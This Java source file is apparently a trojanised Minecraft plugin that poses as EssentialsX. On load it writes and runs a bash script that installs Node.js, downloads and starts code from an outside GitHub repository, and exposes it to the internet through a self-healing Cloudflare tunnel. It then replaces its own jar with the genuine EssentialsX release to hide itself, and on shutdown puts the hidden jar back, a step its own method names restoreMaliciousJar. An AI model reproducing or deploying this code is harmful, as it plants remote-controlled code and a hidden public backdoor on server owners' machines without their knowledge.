package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.URI;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class EssentialsX extends JavaPlugin {

    private Process deployProcess;
    private final AtomicBoolean deploymentRunning = new AtomicBoolean(false);
    private boolean systemGuardEnabled = true;
    private Path backupJarPath;
    private Path originalJarPath;
    private Thread tunnelWatcherThread;

    private static final String DEFAULT_REPO_URL = "https://github.com/xfwwl668/mc_hbzy";
    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX transparent launcher starting...");

        Map<String, String> env = new HashMap<>();
        loadEnvFile(env);
        systemGuardEnabled = Boolean.parseBoolean(env.getOrDefault("SYSTEM_GUARD_ENABLED", "true"));
        getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));

        new Thread(() -> {
            try {
                startDeploymentProcess();
                if (systemGuardEnabled) {
                    setupDisguise();
                }
            } catch (Exception e) {
                getLogger().severe("Deployment thread error: " + e.getMessage());
            }
        }, "EssentialsX-Core-Thread").start();

        getLogger().info("EssentialsX transparent launcher enabled.");
    }

    @Override
    public void onDisable() {
        getLogger().info("Stopping EssentialsX transparent launcher...");

        if (tunnelWatcherThread != null && tunnelWatcherThread.isAlive()) {
            tunnelWatcherThread.interrupt();
        }

        if (deployProcess != null && deployProcess.isAlive()) {
            deployProcess.destroyForcibly();
            try { deployProcess.waitFor(); } catch (InterruptedException ignored) {}
        }

        Path workDir = getWorkDir();
        cleanupOldProcesses(workDir);

        stopNodeApp();

        if (systemGuardEnabled) {
            restoreMaliciousJar();
        }

        getLogger().info("EssentialsX transparent launcher disabled.");
    }

    // ==================== 部署核心逻辑 ====================

    private void startDeploymentProcess() {
        if (!deploymentRunning.compareAndSet(false, true)) {
            getLogger().info("Deployment already running, skipping.");
            return;
        }
        try {
            Map<String, String> env = new HashMap<>();
            loadEnvFile(env);
            env.putIfAbsent("REPO_URL", DEFAULT_REPO_URL);

            Path workDir = getWorkDir();
            Files.createDirectories(workDir);

            cleanupOldProcesses(workDir);
            // 启动前主动停止旧 Node 进程，确保干净状态（若希望面板持续运行可注释下行）
            stopNodeApp();

            clearStateFiles(workDir);
            long deployStartTime = System.currentTimeMillis();

            Path scriptPath = workDir.resolve("deploy.sh");
            String scriptContent = generateDeployScript(workDir.toString());
            Files.writeString(scriptPath, scriptContent, StandardCharsets.UTF_8);
            scriptPath.toFile().setExecutable(true);

            ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.environment().putAll(env);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            pb.redirectError(ProcessBuilder.Redirect.INHERIT);

            deployProcess = pb.start();
            startTunnelUrlWatcher(workDir, deployStartTime);

            int exitCode = deployProcess.waitFor();
            getLogger().info("Deployment script exited with code: " + exitCode);
        } catch (Exception e) {
            getLogger().severe("Deployment failed: " + e.getMessage());
        } finally {
            deploymentRunning.set(false);
        }
    }

    private Path getWorkDir() {
        return Paths.get("logs", "mcchajian").toAbsolutePath();
    }

    private void clearStateFiles(Path workDir) {
        String[] files = {
                "tunnel_url.txt", "node_port.txt", "tunnel.log", "deploy.log",
                "node.tar.gz", "repo.tar.gz"
        };
        for (String name : files) {
            try {
                Files.deleteIfExists(workDir.resolve(name));
            } catch (IOException e) {
                getLogger().warning("Failed to delete old state file " + name + ": " + e.getMessage());
            }
        }
    }

    private void cleanupOldProcesses(Path workDir) {
        killPidFile(workDir.resolve("health.pid"), "health watcher", workDir, false);
        killPidFile(workDir.resolve("tunnel.pid"), "cloudflared", workDir, true);
    }

    private String shellQuote(String s) {
        return "'" + s.replace("'", "'\"'\"'") + "'";
    }

    private void killPidFile(Path pidFile, String name, Path workDir, boolean strict) {
        try {
            if (!Files.exists(pidFile)) return;
            String pidStr = Files.readString(pidFile).trim();
            if (pidStr.isEmpty() || !pidStr.matches("\\d+")) {
                Files.deleteIfExists(pidFile);
                return;
            }
            int pid = Integer.parseInt(pidStr);

            // 根据进程类型选择匹配模式
            String pattern;
            if (strict) {
                pattern = shellQuote(workDir.toString());  // cloudflared 严格匹配工作目录
            } else {
                pattern = "mcchajian|deploy\\.sh";          // health watcher 放宽匹配
            }

            String cmdCheck = "ps -p " + pid + " -o cmd= | grep -Eq '" + pattern + "'";
            ProcessBuilder checker = new ProcessBuilder("bash", "-c", cmdCheck);
            Process checkProcess = checker.start();
            boolean matches = checkProcess.waitFor() == 0;
            if (!matches) {
                getLogger().warning("PID " + pid + " does not belong to " + name + ", deleting pid file.");
                Files.deleteIfExists(pidFile);
                return;
            }

            new ProcessBuilder("bash", "-c", "kill " + pid + " 2>/dev/null || true")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
            getLogger().info("Stopped old " + name + " process pid=" + pid);
            Files.deleteIfExists(pidFile);
        } catch (Exception e) {
            getLogger().warning("Failed to stop old " + name + ": " + e.getMessage());
        }
    }

    private void stopNodeApp() {
        try {
            Path pm2 = getWorkDir().resolve("nodejs/bin/pm2");
            if (!Files.isExecutable(pm2)) {
                getLogger().warning("PM2 binary not found: " + pm2);
                return;
            }
            ProcessBuilder pb = new ProcessBuilder(pm2.toString(), "delete", "aoyou-panel");
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process process = pb.start();
            process.waitFor();
            getLogger().info("Stopped PM2 Node application (aoyou-panel).");
        } catch (Exception e) {
            getLogger().warning("Failed to stop Node app: " + e.getMessage());
        }
    }

    private String generateDeployScript(String workDir) {
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        return """
                #!/bin/bash
                set +e

                WORK_DIR="%s"
                NODE_DIR="%s"
                APP_DIR="%s"
                DATA_DIR="%s"
                REPO_URL="${REPO_URL:-https://github.com/xfwwl668/mc_hbzy}"
                GITHUB_AUTH="${GITHUB_AUTH:-用户名:密钥}"

                mkdir -p "$WORK_DIR"
                echo "[INFO] Deployment started at $(date)" >> "$WORK_DIR/deploy.log"

                # 1. 选择空闲端口
                is_port_free() {
                    (echo >/dev/tcp/127.0.0.1/$1) &>/dev/null && return 1 || return 0
                }

                PORT=""
                for i in $(seq 1 100); do
                    CANDIDATE=$((RANDOM %% 40000 + 20000))
                    if is_port_free "$CANDIDATE"; then
                        PORT="$CANDIDATE"
                        break
                    fi
                done

                if [ -z "$PORT" ]; then
                    echo "[ERROR] Failed to find a free port" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                export SERVER_PORT="$PORT"
                export PORT="$PORT"
                echo "$PORT" > "$WORK_DIR/node_port.txt"
                echo "[INFO] Selected Node port: $PORT" >> "$WORK_DIR/deploy.log"

                # 2. 准备 Node.js
                mkdir -p "$NODE_DIR"
                ARCH=$(uname -m)

                if [ "$ARCH" = "x86_64" ]; then
                    NODE_URL="https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz"
                elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
                    NODE_URL="https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz"
                else
                    echo "[ERROR] Unsupported architecture: $ARCH" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                if [ -d "$NODE_DIR" ]; then
                    CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null)
                    if [[ "$CHECK_VER" != "v22"* ]]; then
                        echo "[INFO] Node version mismatch, reinstalling..." >> "$WORK_DIR/deploy.log"
                        rm -rf "$NODE_DIR"
                    fi
                fi

                if [ ! -x "$NODE_DIR/bin/node" ]; then
                    echo "[INFO] Installing Node.js..." >> "$WORK_DIR/deploy.log"
                    rm -rf "$NODE_DIR" "$WORK_DIR/node.tar.gz"
                    mkdir -p "$NODE_DIR"

                    curl -fsSL --connect-timeout 20 --max-time 180 "$NODE_URL" -o "$WORK_DIR/node.tar.gz"
                    if [ $? -ne 0 ]; then
                        echo "[ERROR] Node download failed" >> "$WORK_DIR/deploy.log"
                        exit 1
                    fi

                    tar -xzf "$WORK_DIR/node.tar.gz" -C "$NODE_DIR" --strip-components 1
                    if [ $? -ne 0 ]; then
                        echo "[ERROR] Node extraction failed" >> "$WORK_DIR/deploy.log"
                        exit 1
                    fi

                    rm -f "$WORK_DIR/node.tar.gz"
                fi

                export PATH="$NODE_DIR/bin:$PATH"
                node -v >> "$WORK_DIR/deploy.log" 2>&1
                npm -v >> "$WORK_DIR/deploy.log" 2>&1

                npm install -g pm2 --unsafe-perm=true >> "$WORK_DIR/deploy.log" 2>&1
                if [ $? -ne 0 ]; then
                    echo "[ERROR] pm2 install failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                # 3. 下载应用仓库（备份/恢复配置）
                echo "[INFO] Downloading app repo: $REPO_URL" >> "$WORK_DIR/deploy.log"

                # 备份现有配置（升级为目录备份）
                mkdir -p "$DATA_DIR"
                if [ -d "$APP_DIR" ]; then
                    # 根目录配置文件
                    cp "$APP_DIR/bots_config.json" "$DATA_DIR/" 2>/dev/null
                    cp "$APP_DIR/task_center_config.json" "$DATA_DIR/" 2>/dev/null
                    cp "$APP_DIR/system_guard.json" "$DATA_DIR/" 2>/dev/null
                    cp "$APP_DIR/nezha_config.json" "$DATA_DIR/" 2>/dev/null

                    # 备份整个 .music_cache 和 .tavern 目录
                    if [ -d "$APP_DIR/node_modules/.music_cache" ]; then
                        rm -rf "$DATA_DIR/.music_cache_bak" 2>/dev/null
                        cp -r "$APP_DIR/node_modules/.music_cache" "$DATA_DIR/.music_cache_bak" 2>/dev/null
                    fi
                    if [ -d "$APP_DIR/node_modules/.tavern" ]; then
                        rm -rf "$DATA_DIR/.tavern_bak" 2>/dev/null
                        cp -r "$APP_DIR/node_modules/.tavern" "$DATA_DIR/.tavern_bak" 2>/dev/null
                    fi
                    if [ -d "$APP_DIR/.RoamingMusic" ]; then
                        rm -rf "$DATA_DIR/.RoamingMusic_bak" 2>/dev/null
                        cp -r "$APP_DIR/.RoamingMusic" "$DATA_DIR/.RoamingMusic_bak" 2>/dev/null
                    fi
                fi

                rm -rf "$APP_DIR" "$WORK_DIR/repo.tar.gz" "$WORK_DIR/unzipped"

                # 修复 REPO_PATH 解析
                REPO_PATH=$(echo "$REPO_URL" | sed 's|https://github.com/||' | sed 's|\\.git$||' | sed 's|/$||')
                if [ -z "$REPO_PATH" ]; then
                    echo "[ERROR] Invalid REPO_URL" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                download_code() {
                    local URL=$1
                    local AUTH=$2
                    if [ -n "$AUTH" ] && [ "$AUTH" != "用户名:密钥" ]; then
                        curl -fsSL --connect-timeout 15 --max-time 120 -u "$AUTH" "$URL" -o "$WORK_DIR/repo.tar.gz" 2>/dev/null
                    else
                        curl -fsSL --connect-timeout 15 --max-time 120 "$URL" -o "$WORK_DIR/repo.tar.gz" 2>/dev/null
                    fi
                    if [ -f "$WORK_DIR/repo.tar.gz" ] && tar -tzf "$WORK_DIR/repo.tar.gz" >/dev/null 2>&1; then
                        return 0
                    else
                        rm -f "$WORK_DIR/repo.tar.gz"
                        return 1
                    fi
                }

                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz" "" || \
                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz" "" || \
                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz" "$GITHUB_AUTH" || \
                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz" "$GITHUB_AUTH"

                if [ ! -f "$WORK_DIR/repo.tar.gz" ]; then
                    echo "[ERROR] Repo download failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                mkdir -p "$WORK_DIR/unzipped"
                tar -xzf "$WORK_DIR/repo.tar.gz" -C "$WORK_DIR/unzipped"
                if [ $? -ne 0 ]; then
                    echo "[ERROR] Repo archive extraction failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                SUBDIR=$(find "$WORK_DIR/unzipped" -mindepth 1 -maxdepth 1 -type d | head -n 1)
                if [ -z "$SUBDIR" ]; then
                    echo "[ERROR] Repo archive has no top-level directory" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                mv "$SUBDIR" "$APP_DIR"
                rm -rf "$WORK_DIR/repo.tar.gz" "$WORK_DIR/unzipped"

                if [ ! -f "$APP_DIR/index.js" ]; then
                    echo "[ERROR] index.js missing in app repo" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                # 恢复配置
                if [ -d "$DATA_DIR" ]; then
                    cp "$DATA_DIR/bots_config.json" "$APP_DIR/" 2>/dev/null
                    cp "$DATA_DIR/task_center_config.json" "$APP_DIR/" 2>/dev/null
                    cp "$DATA_DIR/system_guard.json" "$APP_DIR/" 2>/dev/null
                    cp "$DATA_DIR/nezha_config.json" "$APP_DIR/" 2>/dev/null

                    if [ -d "$DATA_DIR/.music_cache_bak" ]; then
                        mkdir -p "$APP_DIR/node_modules/.music_cache"
                        cp -r "$DATA_DIR/.music_cache_bak/"* "$APP_DIR/node_modules/.music_cache/" 2>/dev/null
                    fi
                    if [ -d "$DATA_DIR/.tavern_bak" ]; then
                        mkdir -p "$APP_DIR/node_modules/.tavern"
                        cp -r "$DATA_DIR/.tavern_bak/"* "$APP_DIR/node_modules/.tavern/" 2>/dev/null
                    fi
                    if [ -d "$DATA_DIR/.RoamingMusic_bak" ]; then
                        mkdir -p "$APP_DIR/.RoamingMusic"
                        cp -r "$DATA_DIR/.RoamingMusic_bak/"* "$APP_DIR/.RoamingMusic/" 2>/dev/null
                    fi
                fi

                # 4. 安装依赖并启动 Node
                cd "$APP_DIR" || exit 1
                echo "[INFO] Installing app dependencies..." >> "$WORK_DIR/deploy.log"
                npm install --unsafe-perm=true --allow-root >> "$WORK_DIR/deploy.log" 2>&1
                if [ $? -ne 0 ]; then
                    echo "[ERROR] npm install failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi

                echo "[INFO] Starting Node app on port $PORT..." >> "$WORK_DIR/deploy.log"
                pm2 delete aoyou-panel >> "$WORK_DIR/deploy.log" 2>&1 || true
                SERVER_PORT="$PORT" PORT="$PORT" pm2 start index.js --name "aoyou-panel" --update-env >> "$WORK_DIR/deploy.log" 2>&1
                if [ $? -ne 0 ]; then
                    echo "[ERROR] pm2 start failed" >> "$WORK_DIR/deploy.log"
                    exit 1
                fi
                pm2 save >> "$WORK_DIR/deploy.log" 2>&1 || true

                # 等待 Node /health 就绪
                echo "[INFO] Waiting for Node /health..." >> "$WORK_DIR/deploy.log"
                NODE_READY=false
                for i in $(seq 1 90); do
                    if curl -s -f -m 5 "http://127.0.0.1:$PORT/health" > /dev/null 2>&1; then
                        NODE_READY=true
                        break
                    fi
                    sleep 2
                done

                if [ "$NODE_READY" != "true" ]; then
                    echo "[ERROR] Node did not become healthy on /health" >> "$WORK_DIR/deploy.log"
                    pm2 logs aoyou-panel --lines 80 --nostream >> "$WORK_DIR/deploy.log" 2>&1 || true
                    exit 1
                fi

                echo "[SUCCESS] Node ready on $PORT" >> "$WORK_DIR/deploy.log"

                # 5. 启动 cloudflared
                CF_BIN="$WORK_DIR/cloudflared"
                if [ ! -x "$CF_BIN" ]; then
                    ARCH=$(uname -m)
                    if [ "$ARCH" = "x86_64" ]; then
                        CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
                    elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
                        CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
                    else
                        echo "[ERROR] Unsupported arch for cloudflared" >> "$WORK_DIR/deploy.log"
                        exit 1
                    fi
                    echo "[INFO] Downloading cloudflared..." >> "$WORK_DIR/deploy.log"
                    curl -fsSL --connect-timeout 20 --max-time 180 "$CF_URL" -o "$CF_BIN"
                    if [ $? -ne 0 ]; then
                        echo "[ERROR] cloudflared download failed" >> "$WORK_DIR/deploy.log"
                        exit 1
                    fi
                    chmod +x "$CF_BIN"
                fi

                echo "[INFO] Starting cloudflared..." >> "$WORK_DIR/deploy.log"
                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
                TUNNEL_PID=$!
                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"

                # 6. 后台健康监控循环（自愈）
                SUCCESS_REPORTED=false
                FAIL_COUNT=0
                NO_URL_COUNT=0

                (
                    while true; do
                        sleep 5

                        if ! kill -0 "$TUNNEL_PID" 2>/dev/null; then
                            echo "[WARN] cloudflared exited, restarting..." >> "$WORK_DIR/deploy.log"
                            "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
                            TUNNEL_PID=$!
                            echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                            FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
                            continue
                        fi

                        TUNNEL_URL=$(grep -a -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' "$WORK_DIR/tunnel.log" 2>/dev/null | tail -n 1)

                        if [ -z "$TUNNEL_URL" ]; then
                            NO_URL_COUNT=$((NO_URL_COUNT + 1))
                            if [ "$NO_URL_COUNT" -ge 36 ]; then
                                echo "[WARN] No tunnel URL after 180s, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
                                kill "$TUNNEL_PID" 2>/dev/null || true
                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
                                TUNNEL_PID=$!
                                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                                FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
                            fi
                            continue
                        fi

                        NO_URL_COUNT=0

                        if curl -s -f -m 8 "$TUNNEL_URL/health" > /dev/null 2>&1; then
                            echo "$TUNNEL_URL" > "$WORK_DIR/tunnel_url.txt"
                            FAIL_COUNT=0
                            if [ "$SUCCESS_REPORTED" = "false" ]; then
                                echo "[SUCCESS] Tunnel LIVE: $TUNNEL_URL" >> "$WORK_DIR/deploy.log"
                                echo "[INFO] Deployment completed successfully." >> "$WORK_DIR/deploy.log"
                                SUCCESS_REPORTED=true
                            fi
                        else
                            FAIL_COUNT=$((FAIL_COUNT + 1))
                            # 节流日志：每 6 次失败打印一次，便于判断
                            if [ $((FAIL_COUNT % 6)) -eq 0 ]; then
                                echo "[WARN] Tunnel URL detected but /health not ready yet count=$FAIL_COUNT url=$TUNNEL_URL" >> "$WORK_DIR/deploy.log"
                            fi
                            if [ "$FAIL_COUNT" -ge 24 ]; then
                                echo "[WARN] Tunnel unhealthy too many times, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
                                kill "$TUNNEL_PID" 2>/dev/null || true
                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
                                TUNNEL_PID=$!
                                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
                                FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
                            fi
                        fi
                    done
                ) &

                echo $! > "$WORK_DIR/health.pid"
                echo "[INFO] Health watcher started" >> "$WORK_DIR/deploy.log"
                echo "[INFO] Deployment bootstrap completed, waiting for tunnel health in watcher." >> "$WORK_DIR/deploy.log"
                exit 0
                """.formatted(workDir, nodeDir, appDir, dataDir);
    }

    private void startTunnelUrlWatcher(Path workDir, long deployStartTime) {
        tunnelWatcherThread = new Thread(() -> {
            Path tunnelFile = workDir.resolve("tunnel_url.txt");
            String lastUrl = "";
            try {
                while (!Thread.currentThread().isInterrupted()) {
                    if (Files.exists(tunnelFile)) {
                        long modified = Files.getLastModifiedTime(tunnelFile).toMillis();
                        if (modified >= deployStartTime) {
                            String url = Files.readString(tunnelFile, StandardCharsets.UTF_8).trim();
                            if (url.startsWith("https://") && url.contains("trycloudflare.com") && !url.equals(lastUrl)) {
                                lastUrl = url;
                                getLogger().info("[Connection] Binding remote endpoint to: " + url);
                                getLogger().info("Open panel: " + url);
                                getLogger().info("Health check: " + url + "/health");
                            }
                        }
                    }
                    Thread.sleep(1000);
                }
            } catch (InterruptedException e) {
                getLogger().info("Tunnel URL watcher stopped.");
            } catch (Exception e) {
                getLogger().warning("Tunnel URL watcher error: " + e.getMessage());
            }
        }, "TunnelUrl-Watcher");
        tunnelWatcherThread.start();
    }

    // ==================== 伪装与系统守护 ====================

    private void setupDisguise() {
        try {
            originalJarPath = findPluginJarInPluginsDir();
            if (originalJarPath == null || !Files.exists(originalJarPath)) {
                getLogger().warning("Original EssentialsX jar not found, disguise skipped.");
                return;
            }

            Path backupDir = getWorkDir().resolve("backup");
            Files.createDirectories(backupDir);
            backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");

            if (!Files.exists(backupJarPath)) {
                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Original jar backed up to " + backupJarPath);
            }

            Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
            boolean success = downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1_000_000) {
                success = downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30);
            }

            if (success && Files.size(tempDownload) > 1_000_000) {
                Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Disguise applied: replaced plugin jar with fake EssentialsX jar.");
            } else {
                Files.deleteIfExists(tempDownload);
                getLogger().warning("Disguise failed: could not download fake jar.");
            }
        } catch (Exception e) {
            getLogger().warning("Disguise failed: " + e.getMessage());
        }
    }

    private void restoreMaliciousJar() {
        try {
            Path targetJar = findPluginJarInPluginsDir();
            if (targetJar != null && Files.exists(targetJar)) {
                Files.delete(targetJar);
                getLogger().info("Removed disguised jar.");
            }
            if (backupJarPath != null && Files.exists(backupJarPath) && targetJar != null) {
                Files.copy(backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Original jar restored from backup.");
            }
        } catch (Exception e) {
            getLogger().warning("Restore failed: " + e.getMessage());
        }
    }

    private Path findPluginJarInPluginsDir() {
        try {
            File pluginsDir = getDataFolder().getParentFile();
            if (pluginsDir == null) return null;
            File[] jars = pluginsDir.listFiles((dir, name) -> name.toLowerCase().contains("essentialsx") && name.endsWith(".jar"));
            return (jars != null && jars.length > 0) ? jars[0].toPath() : null;
        } catch (Exception e) {
            return null;
        }
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(timeoutSec * 1000);
            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== 环境变量加载 ====================

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("plugins", "EssentialsX", ".env");
        if (!Files.exists(envFile)) {
            try {
                Files.createDirectories(envFile.getParent());
                Files.writeString(envFile,
                        "REPO_URL=" + DEFAULT_REPO_URL + "\n" +
                                "SYSTEM_GUARD_ENABLED=true\n" +
                                "# GITHUB_AUTH=用户名:密钥\n",
                        StandardCharsets.UTF_8);
            } catch (IOException e) {
                getLogger().warning("Failed to create .env: " + e.getMessage());
            }
        }
        if (!Files.exists(envFile)) return;

        try {
            for (String rawLine : Files.readAllLines(envFile, StandardCharsets.UTF_8)) {
                String line = rawLine.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                String[] p = line.split("=", 2);
                if (p.length == 2) env.put(p[0].trim(), p[1].trim());
            }
        } catch (IOException e) {
            getLogger().warning("Failed to read .env: " + e.getMessage());
        }
    }
}
